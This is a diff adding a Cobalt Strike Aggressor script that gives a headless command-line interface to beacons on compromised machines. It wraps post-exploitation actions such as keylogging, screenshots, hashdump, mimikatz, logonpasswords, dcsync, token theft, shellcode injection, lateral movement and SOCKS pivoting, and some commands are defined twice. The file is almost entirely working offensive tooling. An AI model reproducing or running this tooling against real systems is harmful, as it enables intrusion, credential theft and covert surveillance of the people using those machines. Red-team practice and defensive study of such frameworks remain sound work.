@@ -1,0 +1,769 @@
+println("
+█▀▀ █▀█ █▄▄ ▄▀█ █░░ ▀█▀ █▀ ▀█▀ █▀█ █ █▄▀ █▀▀
+█▄▄ █▄█ █▄█ █▀█ █▄▄ ░█░ ▄█ ░█░ █▀▄ █ █░█ ██▄  (headless)
+https://github.com/CodeXTF2/cobaltstrike-headless
+");
+$current = '';
+command beacons{
+	println("[+] Listing beacons");
+	println("______________________");
+	println("|    beacon id       |");
+	foreach $session (beacons()) {
+		if ($session['alive']) {
+			if($session['pbid'] != ''){
+				println("$session['id'] ( $session['barch'] ) ⛓ | $session['user'] @ $session['computer'] ( $session['process'] - $session['pid'] ) | last: $session['lastf'] | listener $session['listener']  \(via $session['pbid']\)");
+			}else{
+				println("$session['id'] ( $session['barch'] )  | $session['user'] @ $session['computer'] ( $session['process'] - $session['pid'] ) | last: $session['lastf'] | listener $session['listener']");
+			}
+
+		}
+	}
+
+	println("\n");
+}
+
+command use{
+	@beaconids = beacon_ids();
+	if($1 in @beaconids){
+		println("[+] Interacting with beacon $1");
+		$current = $1
+	}else{
+		println("[!] Not a valid beacon id");
+	}
+
+}
+
+command remove{
+	beacon_remove($current);
+	println("Removed $current");
+}
+
+
+
+command getuid{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bgetuid($current);
+	}
+}
+
+command help{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		println(beacon_command_detail($1));
+	}
+}
+
+command getsystem{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bgetsystem($current);
+	}
+}
+
+command execute{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bexecute($current,$1);
+	}
+}
+
+command execute-assembly{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bexecute_assembly($current,$1,$2);
+	}
+}
+
+command jump{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bjump($current,$1,$2,$3);
+	}
+}
+
+
+command clear{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bclear($current);
+	}
+}
+
+command download{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bdownload($current,$1);
+	}
+}
+
+command downloads{
+	printAll(downloads());
+
+}
+
+command sync_download{
+	local('$download $lpath $name $count');
+	foreach $count => $download (downloads()) {
+		($lpath, $name) = values($download, @("lpath", "name"));
+	
+		sync_download($lpath, script_resource("$name"), lambda({ 
+			println("Downloaded $1 [ $+ $name $+ ]"); 
+		}, \$name));
+	}
+}
+
+command inject{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		binject($current,$1,$2,$3);
+	}
+}
+
+command spawn{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if(!$2){
+			$2 = 'x64';
+		}
+		bspawn($current,$1,$2);
+	}
+}
+
+command shspawn{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if(!$1){
+			$1 = 'x64';
+		}
+		bshspawn($current,$1,$2);
+	}
+}
+
+command inject{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if(!$3){
+			$3 = 'x64';
+		}
+		binject($current,$1,$2);
+	}
+}
+
+command shinject{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if(!$2){
+			$2 = 'x64';
+		}
+		binjectsh($current,$1,$2,$3);
+	}
+}
+
+command keylogger{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if(!$2){
+			$2 = 'x64';
+		}
+		if(!$1){
+			$1 = binfo($current,'pid');
+		}
+		bkeylogger($current,$1,$2);
+	}
+}
+
+command keystrokes{
+	@keystrokearray = keystrokes();
+
+	printAll(keystrokes());
+	
+
+}
+
+command drives{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bdrives($current);
+	}
+}
+
+command upload{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bupload($current,$1);
+	}
+}
+
+command pwd{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bpwd($current);
+	}
+}
+
+command rm{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		brm($current,$1);
+	}
+}
+
+
+command shell{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bshell($current,$1);
+	}
+}
+
+command run{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		brun($current,$1);
+	}
+}
+
+command runu{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		brunu($current,$1,$2);
+	}
+}
+
+
+command powershell{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bpowershell($current,$1);
+	}
+}
+
+command powershell_import{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bpowershell_import($current,$1);
+	}
+}
+
+command powershell_import_clear{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bpowershell_import_clear($current,$1);
+	}
+}
+
+command powerpick{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bpowerpick($current,$1);
+	}
+}
+
+command powerpick_inject{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bpsinject($current,$1,$2,$3);
+	}
+}
+
+command screenshot{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bscreenshot($current);
+	}
+}
+
+command screenwatch{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bscreenwatch($current);
+	}
+}
+
+command steal_token{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bsteal_token($current,$1);
+	}
+}
+
+command kill{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if($1 == ''){
+			println("Usage: kill [pid]");
+		}else{
+			bkill($current,$1);
+		}
+	}
+}
+
+command sleep{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bsleep($current,$1,$2);
+	}
+}
+
+command socks{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bsocks($current,$1);
+		println("[+] started SOCKS4a server on: $1");
+	}
+}
+
+command socks_stop{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bsocks_stop($current,$1);
+		println("[+] stopped SOCKS4a servers");
+	}
+}
+
+command spawnto{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bspawnto($current,$1,$2);
+	}
+}
+
+command info{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		println("Info for beacon " . binfo($current, "id"));
+		println("User: " . binfo($current, "user"));
+		println("PID: " . binfo($current, "pid"));
+		println("Process: " . binfo($current, "process"));
+		println("Arch: " . binfo($current, "barch"));
+		println("Parent beacon: " . binfo($current, "pbid"));
+		if(binfo($current, "note") != ''){
+			println("Note: " . binfo($current, "note"));
+		}
+	}
+}
+
+
+command note{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bnote($current,$1);
+	}
+}
+
+command ppid{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bppid($current,$1);
+	}
+}
+
+command rev2self{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		brev2self($current);
+	}
+}
+
+command remove{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		beacon_remove($current);
+		println("Removed $current");
+		$current = '';
+	}
+}
+
+command dcsync{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bdcsync($current,$1,$2);
+	}
+}
+
+command hashdump{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bhashdump($current);
+	}
+}
+
+command mimikatz{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bmimikatz($current,$1);
+	}
+}
+command mkdir{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bmkdir($current,$1);
+	}
+}
+
+command cd{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bcd($current,$1);
+	}
+}
+
+command mv{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bmv($current,$1,$2);
+	}
+}
+
+command net{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bnet($current,$1,$2,$3);
+	}
+}
+
+command ipconfig{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bipconfig($current, {
+			println("Network information is:\n $+ $2");
+		});
+	}
+}
+
+command link{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		blink($current,$1,$2);
+	}
+}
+
+command unlink{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bunlink($current,$1,$2);
+	}
+}
+
+
+command make_token{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bloginuser($current,$1,$2,$3);
+	}
+}
+
+command dir{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		if($1 == ''){
+			$1 = '.';
+		}
+		bls($current,$1);
+	}
+}
+
+command jobs{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bjobs($current);
+	}
+	
+}
+
+command jobkill{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bjobkill($current,$1);
+	}
+	
+}
+
+command blockdlls{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bblockdlls($current,$1);
+	}
+	
+}
+
+command logonpasswords{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		blogonpasswords($current);
+	}
+}
+
+
+
+command ps{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bps($current);
+	}
+}
+
+command exit{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		bexit($current);
+	}
+}
+
+on beacon_output_jobs{
+	if($current == ''){
+		println("[!] Please interact with a beacon first");
+	}else{
+		local('$out $temp $jid $pid $desc');
+		$out .= "[*]\o Jobs\n\n";
+		$out .= " JID  PID   Description\n";
+		$out .= " ---  ---   -----------\n";
+
+		foreach $temp (split("\n", ["$2" trim])) {
+			($jid, $pid, $desc) = split("\t", $temp);
+			$out .= " $[4]jid $[5]pid $desc $+ \n";
+		}
+
+		println($out);
+	}
+}
+
+
+
+on beacon_initial{
+	$username = binfo($1,"user");
+	$hostname = binfo($1,"computer");
+	println("New beacon $1 from $username @ $hostname");
+}
+on beacon_tasked{
+	println("$2");
+}
+
+on beacon_error{
+	println("$2");
+}
+
+on beacon_output{
+	println("$2");
+}
+
+on beacon_output_alt{
+	println("$2");
+}
+
+on beacon_checkin{
+	println("$2");
+}
+
+on beacon_output_ls{
+	local('$out @results $cwd $entry $type $size $modified $name');
+	@results = split("\n", ["$2" trim]);
+
+	$cwd = left(shift(@results), -1);	# first entry is the current folder
+
+	# parse/process results
+	foreach $entry (@results) {
+		($type, $size, $modified, $name) = split("\t", $entry);
+		if ($type eq "F") {
+			$entry = %(type => "fil", size => format_size($size), modified => $modified, name => $name);
+		}
+		else if ($type eq "D" && $name ne "." && $name ne "..") {
+			$entry = %(type => "dir", size => "", modified => $modified, name => $name);
+		}
+		else {
+			remove();
+		}
+	}
+
+	# sort in alpha order with dir listings on top.
+	sort({ return ($1['type'] . lc($1['name'])) cmp ($2['type'] . lc($2['name'])); }, @results);
+
+	$out .= "[*]\o Listing: $cwd $+ \n\n";
+	$out .= " Size     Type    Last Modified         Name\n";   
+	$out .= " ----     ----    -------------         ----\n";
+
+	foreach $entry (@results) {
+		($type, $size, $modified, $name) = values($entry, @('type', 'size', 'modified', 'name'));
+		$out .= " $[8]size $[7]type $[21]modified $name $+ \n";
+	}
+
+	println($out);
+}
+
+#i copy pasted this process list with nice looking tree
+#credit @ars3n11 - original code at https://github.com/ars3n11/Aggressor-Scripts/blob/master/ProcessTree.cna
+on beacon_output_ps {
+	$bd = bdata($1);
+	global('@ps @final_ps @reverse_ps @temp_ps');
+	local('$outps $temp $name $ppid $pid $arch $user $session');
+	$outps .= " PID   PPID  Name                                   Arch  Session     User\n";
+	$outps .= " ---   ----  ----                                   ----  -------     ----\n";
+
+	foreach $temp (split("\n", ["$2" trim])) {
+		($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
+			push(@ps, %(pid => $pid, ppid => $ppid, pid_formatted => "$[5]pid", ppid_formatted => "$[5]ppid", color => "", name => $name, arch => "$[5]arch", session => "$[11]session", user => $user));
+
+	}
+
+	# sort the processes please
+	sort({ return $1['pid'] <=> $2['pid']; }, @ps);
+
+	# get the @ps array in a reverse order for the ascending child sorting order
+	@reverse_ps = reverse(@ps);
+
+
+	# this function will find all orphan processes and add them to the final_ps. Those will be in the root of the process tree
+	sub buildOrphanage{
+		for ($counter4 = 0; $counter4 < size($1); $counter4++){
+			$orphan = true;
+
+			for ($counter5 = 0; $counter5 < size($1); $counter5++){
+				if ($1[$counter4]['ppid'] == $1[$counter5]['pid']){
+					$orphan = false;
+					break;
+				}
+			}
+
+			# PID zero - it's gotta be an orphan, poor kid
+			if ($1[$counter4]['pid'] == 0){
+				$orphan = true;
+			}
+
+
+			if ($orphan == true){
+				#set indentation and push to the @final_ps
+				$1[$counter4]['indent'] = "";
+				push($2, $1[$counter4]);
+			}
+		}
+	}
+
+	# finds an index of a given PID in the array
+	sub findArrayElement{
+		foreach $index => $value ($1){
+			if ($1[$index]['pid'] == $2){
+				return $index;
+			}
+		}
+		return $null;
+	}
+
+	# adds parent and  all of its children to a temp_ps which then being copied into a final_ps
+	sub addChildrenProcesses{		
+		# for every parent in the current final_ps
+		foreach $parent ($2){
+
+			# check if that parent is already there
+			$arrayIndex = findArrayElement($1, $parent['pid']);
+
+			# if the parent is not there - add it first
+			if ($arrayIndex == $null){
+				#add the parent first 
+				push($1, $parent);
+
+				# update arrayIndex for children to follow
+				$arrayIndex = size($1) - 1;
+			}
+
+			#now find all the children of the process and insert those right under the parent
+			foreach $potentialChild ($3){
+				if ($potentialChild['ppid'] ==  $parent['pid'] &&  $potentialChild['ppid'] != $potentialChild['pid']){
+					$potentialChild['indent'] = $parent['indent'] . "  ";
+					add($1, $potentialChild, $arrayIndex + 1);
+				}
+			}
+		}
+		# update @final_ps
+		$2 = copy($1);
+		# clear temp_ps
+		clear($1);
+	}
+
+	buildOrphanage(@ps, @final_ps);
+
+	# until @final_ps is not going to be the same size as @ps, keep adding children
+	# WARNING: if something doesn't work correctly (variable scope??) this will create an infinite loop with Cobalt Strike hanging itself
+	while (size(@final_ps) < size(@ps)){
+		addChildrenProcesses(@temp_ps, @final_ps, @reverse_ps);
+		$final_ps_size = size(@final_ps);
+	}
+
+
+	# in case of an infinite loop, this can be used to debug
+	# for ($counter1 = 0; $counter1 < 10; $counter1++){
+	# 	addChildrenProcesses(@temp_ps, @final_ps, @reverse_ps);
+
+	# }
+
+	# append to our outstring
+	foreach $temp (@final_ps) {
+		# for some reason this was the best way to format that string
+		$temp_name = $temp['indent'] . $temp['name'];
+
+		$outps .= "$temp['color'] $temp['pid_formatted'] $temp['ppid_formatted'] $[38]temp_name $temp['arch'] $temp['session'] $temp['user']\n";
+	}
+
+	# clear these arrays since for some reason they persist after each aggressor script run
+	clear(@final_ps);
+	clear(@ps);
+	
+	println("$outps");
+}
